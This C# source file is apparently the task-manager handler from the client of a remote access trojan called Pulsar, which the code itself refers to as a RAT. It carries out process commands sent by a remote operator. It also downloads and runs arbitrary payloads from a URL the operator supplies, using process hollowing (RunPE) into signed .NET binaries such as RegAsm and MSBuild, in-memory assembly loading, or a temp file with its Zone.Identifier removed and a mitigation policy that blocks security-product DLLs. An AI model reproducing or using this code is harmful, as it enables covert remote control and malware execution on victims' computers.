using Pulsar.Client.Networking;
using Pulsar.Client.Setup;
using Pulsar.Client.Helper;
using Pulsar.Common;
using Pulsar.Common.Enums;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Threading;
using static Pulsar.Client.Utilities.NativeMethods;
using System.Runtime.InteropServices;
using SIZE_T = System.UIntPtr;

namespace Pulsar.Client.Messages
{
    public class TaskManagerHandler : IMessageProcessor, IDisposable
    {
        private readonly PulsarClient _client;
        private readonly WebClient _webClient;

        public TaskManagerHandler(PulsarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _webClient = new WebClient { Proxy = null };
            _webClient.DownloadDataCompleted += OnDownloadDataCompleted;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected && _webClient.IsBusy) _webClient.CancelAsync();
        }

        public bool CanExecute(IMessage message) =>
            message is GetProcesses ||
            message is DoProcessStart ||
            message is DoProcessEnd ||
            message is DoProcessDump ||
            message is DoSetTopMost ||
            message is DoSuspendProcess ||
            message is DoSetWindowState;

        public bool CanExecuteFrom(ISender sender) => true;

        private void SendStatus(string message)
        {
            try { _client.Send(new SetStatus { Message = message }); }
            catch { }
        }

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetProcesses msg: Execute(sender, msg); break;
                case DoProcessStart msg: Execute(sender, msg); break;
                case DoProcessEnd msg: Execute(sender, msg); break;
                case DoProcessDump msg: Execute(sender, msg); break;
                case DoSuspendProcess msg: Execute(sender, msg); break;
                case DoSetTopMost msg: Execute(sender, msg); break;
                case DoSetWindowState msg: Execute(sender, msg); break;
            }
        }
        private void Execute(ISender client, DoProcessEnd message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc != null)
                {
                    proc.Kill();
                    client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = true });
                    SendStatus($"Process PID {message.Pid} ({proc.ProcessName}) successfully terminated");
                }
                else
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
                    SendStatus($"Kill failed: PID {message.Pid} not found");
                }
            }
            catch (System.ComponentModel.Win32Exception ex)
            {
                // Happens when user lacks privileges to terminate the process
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
                SendStatus($"Kill failed for PID {message.Pid}: Access denied (admin privileges required). {ex.Message}");
            }
            catch (Exception ex)
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
                SendStatus($"Kill failed for PID {message.Pid}: {ex.Message}");
            }
        }

        // ---------------------- WINDOW HANDLERS ----------------------
        private void Execute(ISender client, DoSuspendProcess message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc != null)
                {
                    if (message.Suspend)
                        Utilities.NativeMethods.NtSuspendProcess(proc.Handle);
                    else
                        Utilities.NativeMethods.NtResumeProcess(proc.Handle); // <--- process-level resume

                    client.Send(new DoProcessResponse
                    {
                        Action = ProcessAction.Suspend,
                        Result = true
                    });

                    SendStatus($"Process PID {message.Pid} {(message.Suspend ? "suspended" : "resumed")}");
                }
                else
                {
                    client.Send(new DoProcessResponse
                    {
                        Action = ProcessAction.Suspend,
                        Result = false
                    });

                    SendStatus($"Process PID {message.Pid} not found");
                }
            }
            catch
            {
                client.Send(new DoProcessResponse
                {
                    Action = ProcessAction.Suspend,
                    Result = false
                });

                SendStatus($"Failed to {(message.Suspend ? "suspend" : "resume")} PID {message.Pid}");
            }
        }



        private void Execute(ISender client, DoSetWindowState message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc == null || proc.MainWindowHandle == IntPtr.Zero)
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = false });
                    SendStatus($"SetWindowState failed: PID {message.Pid} not found or has no main window");
                    return;
                }

                int nCmd = message.Minimize ? 6 : 9;
                bool result = Utilities.NativeMethods.ShowWindow(proc.MainWindowHandle, nCmd);

                if (result)
                    SendStatus($"Window {(message.Minimize ? "minimized" : "restored")} for PID {message.Pid}");
                else
                    SendStatus($"SetWindowState failed for PID {message.Pid}: Access denied or higher privilege required");

                client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = result });
            }
            catch (Exception ex)
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = false });
                SendStatus($"SetWindowState failed for PID {message.Pid}: {ex.Message}");
            }
        }

        private void Execute(ISender client, DoSetTopMost message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc == null || proc.MainWindowHandle == IntPtr.Zero)
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
                    SendStatus($"SetTopMost failed: PID {message.Pid} not found or has no main window");
                    return;
                }

                const int HWND_TOPMOST = -1;
                const int HWND_NOTOPMOST = -2;
                const uint SWP_NOSIZE = 0x0001;
                const uint SWP_NOMOVE = 0x0002;
                const uint SWP_SHOWWINDOW = 0x0040;

                Utilities.NativeMethods.SetForegroundWindow(proc.MainWindowHandle);
                if (Utilities.NativeMethods.IsIconic(proc.MainWindowHandle))
                    Utilities.NativeMethods.ShowWindow(proc.MainWindowHandle, 9);

                IntPtr hWndInsertAfter = new IntPtr(message.Enable ? HWND_TOPMOST : HWND_NOTOPMOST);
                bool result = Utilities.NativeMethods.SetWindowPos(
                    proc.MainWindowHandle,
                    hWndInsertAfter,
                    0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                );

                if (result)
                    SendStatus($"TopMost {(message.Enable ? "enabled" : "disabled")} for PID {message.Pid}");
                else
                    SendStatus($"SetTopMost failed for PID {message.Pid}: Access denied or higher privilege required");

                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = result });
            }
            catch (Exception ex)
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
                SendStatus($"SetTopMost failed for PID {message.Pid}: {ex.Message}");
            }
        }

        // ---------------------- PROCESS HANDLERS ----------------------

        private void Execute(ISender client, GetProcesses message)
        {
            Process[] pList = Process.GetProcesses();
            var processes = new Common.Models.Process[pList.Length];
            var parentMap = GetParentProcessMap();

            for (int i = 0; i < pList.Length; i++)
            {
                processes[i] = new Common.Models.Process
                {
                    Name = pList[i].ProcessName + ".exe",
                    Id = pList[i].Id,
                    MainWindowTitle = pList[i].MainWindowTitle,
                    ParentId = parentMap.TryGetValue(pList[i].Id, out var parentId) ? parentId : null
                };
            }

            int currentPid = Process.GetCurrentProcess().Id;
            client.Send(new GetProcessesResponse { Processes = processes, RatPid = currentPid });
        }

        private void Execute(ISender client, DoProcessStart message)
        {
            SendStatus($"Starting process: {message.FilePath ?? message.DownloadUrl}");

            if (string.IsNullOrEmpty(message.FilePath) && (message.FileBytes == null || message.FileBytes.Length == 0))
            {
                if (string.IsNullOrEmpty(message.DownloadUrl))
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus("Process start failed: No file path or download URL");
                    return;
                }

                try
                {
                    if (_webClient.IsBusy) { _webClient.CancelAsync(); while (_webClient.IsBusy) Thread.Sleep(50); }
                    _webClient.DownloadDataAsync(new Uri(message.DownloadUrl), message);
                }
                catch
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus("Process start failed: Download error");
                }
            }
            else
            {
                ExecuteProcess(message.FileBytes, message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
            }
        }

        private void OnDownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
        {
            var message = (DoProcessStart)e.UserState;
            if (e.Cancelled || e.Error != null)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus("Process start failed: Download cancelled or error");
                return;
            }
            ExecuteProcess(e.Result, null, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
        }

        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory, bool useRunPE, string runPETarget, string runPECustomPath, string fileExtension)
        {
            if (fileBytes == null && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
                fileBytes = File.ReadAllBytes(filePath);

            if (fileBytes == null || fileBytes.Length == 0)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus("Process start failed: no file bytes available");
                return;
            }

            try
            {
                if (useRunPE) { ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath); return; }
                if (executeInMemory) { ExecuteViaInMemoryDotNet(fileBytes); return; }
                ExecuteViaTemporaryFile(fileBytes, fileExtension);
            }
            catch (Exception ex)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus($"Process start failed: {ex.Message}");
            }
        }

        private void ExecuteViaRunPE(byte[] fileBytes, string runPETarget, string runPECustomPath)
        {
            new Thread(() =>
            {
                try
                {
                    bool result = Helper.RunPE.Execute(GetRunPEHostPath(runPETarget, runPECustomPath, IsPayload64Bit(fileBytes)), fileBytes);
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = result });
                    SendStatus($"RunPE execution {(result ? "succeeded" : "failed")}");
                }
                catch (Exception ex)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus($"RunPE failed: {ex.Message}");
                }
            }).Start();
        }

        private void ExecuteViaInMemoryDotNet(byte[] fileBytes)
        {
            new Thread(() =>
            {
                try
                {
                    Assembly asm = Assembly.Load(fileBytes);
                    MethodInfo entry = asm.EntryPoint;
                    if (entry != null)
                        entry.Invoke(null, entry.GetParameters().Length == 0 ? null : new object[] { new string[0] });
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                    SendStatus(".NET in-memory execution succeeded");
                }
                catch (Exception ex)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus($".NET in-memory execution failed: {ex.Message}");
                }
            }).Start();
        }


        private void ExecuteViaTemporaryFile(byte[] fileBytes, string fileExtension)
        {
            try
            {
                string tempPath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
                File.WriteAllBytes(tempPath, fileBytes);
                FileHelper.DeleteZoneIdentifier(tempPath);

                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                // USE NATIVE METHODS VERSION STRICTLY
                var si = new Utilities.NativeMethods.STARTUPINFOEX();
                si.StartupInfo.cb = Marshal.SizeOf(typeof(Utilities.NativeMethods.STARTUPINFOEX));

                // ---- ATTRIBUTE LIST ----
                IntPtr attrSize = IntPtr.Zero;

                // First call retrieves required bytes
                Utilities.NativeMethods.InitializeProcThreadAttributeList(
                    IntPtr.Zero, 1, 0, ref attrSize);

                si.lpAttributeList = Marshal.AllocHGlobal(attrSize);

                if (!Utilities.NativeMethods.InitializeProcThreadAttributeList(
                    si.lpAttributeList, 1, 0, ref attrSize))
                {
                    throw new Exception("InitializeProcThreadAttributeList failed.");
                }

                try
                {
                    ulong policy =
                        Utilities.NativeMethods.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

                    if (!Utilities.NativeMethods.UpdateProcThreadAttribute(
                        si.lpAttributeList,
                        0,
                        (IntPtr)Utilities.NativeMethods.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                        ref policy,
                        (IntPtr)sizeof(ulong),
                        IntPtr.Zero,
                        IntPtr.Zero))
                    {
                        throw new Exception("UpdateProcThreadAttribute failed.");
                    }

                    // ---- CREATE PROCESS ----
                    bool ok = Utilities.NativeMethods.CreateProcess(
                        null,
                        tempPath,
                        IntPtr.Zero,
                        IntPtr.Zero,
                        false,
                        Utilities.NativeMethods.EXTENDED_STARTUPINFO_PRESENT,
                        IntPtr.Zero,
                        null,
                        ref si,    // << FIXED — correct struct type
                        out pi
                    );

                    if (ok)
                    {
                        Utilities.NativeMethods.CloseHandle(pi.hProcess);
                        Utilities.NativeMethods.CloseHandle(pi.hThread);

                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                        SendStatus("Process executed with mitigation policy.");
                    }
                    else
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = tempPath,
                            UseShellExecute = true
                        });

                        _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                        SendStatus("Executed via fallback Process.Start().");
                    }
                }
                finally
                {
                    if (si.lpAttributeList != IntPtr.Zero)
                    {
                        Utilities.NativeMethods.DeleteProcThreadAttributeList(si.lpAttributeList);
                        Marshal.FreeHGlobal(si.lpAttributeList);
                    }
                }
            }
            catch (Exception ex)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus("Temporary file execution failed: " + ex.Message);
            }
        }

        private Dictionary<int, int?> GetParentProcessMap()
        {
            var map = new Dictionary<int, int?>();
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT ProcessId, ParentProcessId FROM Win32_Process"))
                using (var results = searcher.Get())
                {
                    foreach (ManagementObject obj in results)
                    {
                        int pid = Convert.ToInt32(obj["ProcessId"]);
                        int? parent = obj["ParentProcessId"] != null ? Convert.ToInt32(obj["ParentProcessId"]) : (int?)null;
                        map[pid] = parent != pid ? parent : null;
                    }
                }
            }
            catch { }
            return map;
        }

        private bool IsPayload64Bit(byte[] payload)
        {
            try
            {
                if (payload.Length < 0x40 || payload[0] != 'M' || payload[1] != 'Z') return false;
                int peOffset = BitConverter.ToInt32(payload, 0x3C);
                return BitConverter.ToUInt16(payload, peOffset + 4) == 0x8664;
            }
            catch { return false; }
        }

        private string GetRunPEHostPath(string target, string customPath, bool is64)
        {
            string winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string frameworkDir = is64
                ? Path.Combine(winDir, "Microsoft.NET", "Framework64", "v4.0.30319")
                : Path.Combine(winDir, "Microsoft.NET", "Framework", "v4.0.30319");

            if (!Directory.Exists(frameworkDir))
                frameworkDir = System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory();

            switch (target)
            {
                case "a":
                    return Path.Combine(frameworkDir, "RegAsm.exe");
                case "b":
                    return Path.Combine(frameworkDir, "RegSvcs.exe");
                case "c":
                    return Path.Combine(frameworkDir, "MSBuild.exe");
                case "d":
                    return customPath;
                default:
                    return Path.Combine(frameworkDir, "RegAsm.exe");
            }
        }


        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _webClient.DownloadDataCompleted -= OnDownloadDataCompleted;
                _webClient.CancelAsync();
                _webClient.Dispose();
            }
        }
    }
}
